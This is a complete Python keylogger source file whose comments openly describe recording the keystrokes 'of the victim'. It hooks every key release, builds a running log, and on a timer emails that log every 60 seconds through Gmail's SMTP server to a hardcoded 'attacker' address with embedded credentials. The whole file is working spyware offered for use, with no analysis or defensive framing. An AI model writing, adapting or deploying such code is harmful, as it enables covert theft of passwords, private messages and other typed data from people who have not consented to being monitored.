import keyboard # to log keystrokes of the victim
import smtplib # to help us send emails containing our logs with SMTP

from threading import Timer # makes sure method  runs after an x amount of time
from datetime import datetime

SEND_REPORT = 60 # integer is in seconds;can edit if you feel its too short/long
EMAIL_ADDR = "attacker.email@gmail.com"
EMAIL_PASS = "attackers.password"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # going to  pass SEND_REPORT to interval
        self.interval = interval
        self.report_method = report_method

        self.log = "" # string var that contains log of strokes in self.interval
        self.start_dt = datetime.now() # record start/end datetimes
        self.end_dt = datetime.now()

    # callback used whenever when a keyboard event happens (ex: key is released)
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # len > 1 means its not a character (ctrl, alt, del, etc.)
            # uppercase with []
            if name == "space":
                name  = " " # replaces 'space' with " "
            elif name == "enter":
                name = "[ENTER]\n" # adds newline when ENTER is logged
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name # append the key name to global self.log variable


    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587) # connection to SMTP server
        server.starttls() # connects to SMTP server in TLS mode (for security)
        # login to email account w/ credentials given
        server.login(email, password)
        server.sendmail(email, email, message) # sends the message w/ keylog data
        # terminate the session
        server.quit()

    # sends keylogs and resets self.log
    def report(self):
        # if self.log isn't empty, report it
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDR, EMAIL_PASS, self.log)
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True # sets thread as daemon, dies when main thread dies
        timer.start() # starts timer

    def start(self):
        self.start_dt = datetime.now() # record the start datetime
        keyboard.on_release(callback=self.callback) # start the Keylogger
        self.report() # start reporting the keylogs
        keyboard.wait() # block the current thread, wait until ctrl+c is pressed

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT, report_method="email")
    keylogger.start()
